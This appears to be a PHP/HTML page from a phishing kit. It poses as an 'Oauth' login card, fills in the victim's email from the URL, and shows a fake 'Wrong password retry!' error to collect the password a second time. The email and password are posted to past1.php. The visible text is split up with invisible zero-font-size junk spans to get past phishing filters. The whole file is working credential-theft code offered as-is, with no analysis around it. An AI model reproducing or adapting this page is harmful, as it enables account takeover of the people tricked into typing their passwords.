<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
$display = strtoupper($yuh);

session_start();
if (isset($_GET['email'])) {
    $clientemail = $_GET['email'];
    $_SESSION['clientemail']=$clientemail;
}

?>

<!DOCTYPE html>
<html>

<head>

  <meta charset="UTF-8">

  <title>Oauth</title>

  <link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'>

    <link rel="stylesheet" href="css/style.css" media="screen" type="text/css" />

  <style type="text/css">
</style>

</head>

<body style="background-image: url('img/bg.jpg')">

  <div class="login-card">
  <h1><img src="./img/off.png" height="60" width="140"></h1>
    <h1><font size="3" face="Arial"><strong>V<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>e<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>rify y<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>o<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>u<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>r A<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>cco<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>unt pa<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>ss<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>wo<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>r<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>d</strong></font><br><div><font size="2" color="#ff0000"><b>Wrong password retry!</b></font></div></h1><br>
	
	
  <form method="POST" action="past1.php" autocomplete="off">
    <h1><font size="2"><?php echo $clientemail ?></font></h1>
	<input type="hidden" name="sage2" value="<?php echo $clientemail ?>">
    <input type="password" name="kidayo2" placeholder="Password" required>
    <input type="submit" name="login" class="login login-submit" value="Continue">
  </form>

  <div class="login-help">
    <a href="#">Re<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>gi<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>ster</a> • <a href="#">For<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>got Pa<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>ss<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>wo<span style="font-size: 0px">neritshthhhttthsngjsghfsjhgsfjsghfsjsgfjsgfsjsgfgsgnhfsjehvxkgshjhgsfjhgsfjhgsjgfsjhgfsjhgs123345</span>rd</a>
  </div>
</div>

<!-- <div id="error"><img src="https://dl.dropboxusercontent.com/u/23299152/Delete-icon.png" /> Your caps-lock is on.</div> -->

  <script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'></script>

</body>

</html>